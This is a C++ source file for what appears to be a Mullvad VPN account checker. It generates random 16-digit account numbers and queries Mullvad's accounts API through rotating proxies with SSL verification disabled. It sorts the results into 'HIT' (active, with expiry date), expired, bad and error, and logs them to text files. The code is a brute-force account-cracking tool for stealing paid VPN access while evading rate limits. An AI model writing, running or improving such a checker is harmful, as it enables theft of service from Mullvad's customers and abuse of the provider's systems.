#include <algorithm>
#include <bits/stdc++.h>
#include <cctype>
#include <cpr/cpr.h>
#include <cpr/response.h>
#include <cpr/ssl_options.h>
#include <cpr/timeout.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <exception>
#include <fmt/format.h>
#include <fstream>
#include <iostream>
#include <nlohmann/json.hpp>
#include <pthread.h>
#include <random>
#include <stdexcept>
#include <string>
#include <unordered_map>
#include <vector>

class Mullvad {
private:
  int writeFile(std::string filename, std::string content) {
    if (filename.empty() || content.empty()) {
      std::cerr << "[!] Empty filename or content string.";
    }
    try {
      std::ofstream fout(filename, std::ios::app);
      {
        if (!fout.is_open()) {
          throw std::runtime_error("[!] Failed to open file: " + filename);
        }
        fout << content << std::endl;
      }
    } catch (const std::exception &e) {
      std::cerr << "[!] Failed to write to file: " << e.what() << std::endl;
      return 1;
    }
    return 0;
  }

  void print(std::string msg) { std::cout << msg << std::endl; }

  template <typename... Args>
  void handleResult(const std::string &type, const std::string &accountNumber,
                    const std::string &format_str, Args &&...args) {
    static const std::unordered_map<std::string, std::tuple<std::string, int &>>
        type_map = {{"Hit", {"&2[+] HIT | {} | {}", good}},
                    {"Custom", {"&5[+] CUSTOM | {} | {}", custom}},
                    {"Bad", {"&4[-] BAD | {}", bad}},
                    {"Error", {"&4[!] ERROR: {}", errors}}};
    const auto &[prefix, counter] = type_map.at(type);
    std::string message =
        fmt::format(prefix, accountNumber,
                    fmt::format(format_str, std::forward<Args>(args)...));
    logger(accountNumber, fmt::format(format_str, std::forward<Args>(args)...),
           type);
    print(message);
    counter++;
  }

  void handleResult(const std::string &type, const std::string &accountNumber) {
    static const std::unordered_map<std::string, std::tuple<std::string, int &>>
        type_map = {{"Hit", {"&2[+] HIT | {}", good}},
                    {"Custom", {"&5[+] CUSTOM | {}", custom}},
                    {"Bad", {"&4[-] BAD | {}", bad}},
                    {"Error", {"&4[!] ERROR", errors}}};

    const auto &[prefix, counter] = type_map.at(type);
    std::string message = fmt::format(prefix, accountNumber);

    logger(accountNumber, type, type);
    print(message);
    counter++;
  }

  std::vector<std::string> readFile(const std::string &filename) {
    std::vector<std::string> lines;
    if (filename.empty()) {
      std::cerr << "[!] Empty filename provided" << std::endl;
      return lines;
    }
    try {
      std::ifstream fin(filename);
      if (!fin.is_open()) {
        std::cerr << "[!] Could not open file '" << filename << "'"
                  << std::endl;
        return lines;
      }
      std::string line;
      while (std::getline(fin, line)) {
        if (!line.empty()) {
          lines.push_back(line);
        }
      }
      if (lines.empty()) {
        std::cerr << "[!] File '" << filename << "' is empty" << std::endl;
      }
    } catch (const std::exception &e) {
      std::cerr << "[!] Exception while reading file: " << e.what()
                << std::endl;
    }
    return lines;
  }

public:
  int good;
  int bad;
  int custom;
  int errors;

  void logger(std::string account, std::string capture, std::string status) {
    if (capture.empty() | status.empty()) {
      std::cerr << "[!] Error: Empty capture or status string\n";
      return;
    }
    std::string content;
    std::string filename;
    if (status == "Hit" || status == "Custom") {
      filename = status;
      std::transform(filename.begin(), filename.end(), filename.begin(),
                     [](unsigned char c) { return std::tolower(c); });
      filename += ".txt";
      content = account + " | " + capture;
    } else {
      filename = "errors.txt";
      content = "[!] ERROR" + account;
    }
    writeFile(filename, content);
  }

  std::string gen(int amount) {
    std::string num;
    const std::string digits = "0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, digits.size() - 1);
    for (int i = 0; i < amount; ++i) {
      num = "";
      for (int i = 0; i < 16; ++i) {
        num += digits[dis(gen)];
      }
    }
    return num;
  }

  void create(int amount) {
    std::string num = gen(amount);
    writeFile("created.txt", num);
  }

  void clear() {
    std::cout << "\033[2J\033[1;1H"; // Clear screen >.<
  }

  void checker(const std::string &accountNumber,
               const std::vector<std::string> &proxies) {
    if (proxies.empty()) {
      handleResult("Error", accountNumber, "No proxies available");
      return;
    }
    static bool seeded = false;
    if (!seeded) {
      std::srand(std::time(nullptr));
      seeded = true;
    }
    std::cout << fmt::format("Good: {} ~ Custom: {} ~ Bad: {} ~ Errors: {}",
                             good, custom, bad, errors)
              << "\n";
    const std::string url = fmt::format(
        "https://api-www.mullvad.net/www/accounts/{}", accountNumber);
    try {
      std::string proxy = proxies[std::rand() % proxies.size()];
      cpr::Proxies cpr_proxies{{"http", fmt::format("http://{}", proxy)},
                               {"https", fmt::format("https://{}", proxy)}};
      cpr::Response r = cpr::Get(cpr::Url{url}, cpr_proxies, cpr::Timeout{5000},
                                 cpr::VerifySsl{false});
      auto data = nlohmann::json::parse(r.text);
      if (data.contains("account")) {
        if (data["account"]["active"].get<bool>()) {
          handleResult("Hit", accountNumber, "Active: True | Expires: {}",
                       data["account"]["expires"].get<std::string>());
        } else {
          handleResult("Custom", accountNumber, "Expired");
        }
      } else if (data.contains("code")) {
        data["code"].get<std::string>() == "ACCOUNT_NOT_FOUND"
            ? handleResult("Bad", accountNumber)
            : handleResult("Error", accountNumber);
      }
    } catch (const cpr::Error &e) {
      handleResult("Error", accountNumber, "CPR Error: {}", e.message);
    } catch (const nlohmann::json::exception &e) {
      handleResult("Error", accountNumber, "JSON Error: {}", e.what());
    } catch (const std::exception &e) {
      handleResult("Error", accountNumber, "General Error: {}", e.what());
    }
  }
};

int main() { return 0; }
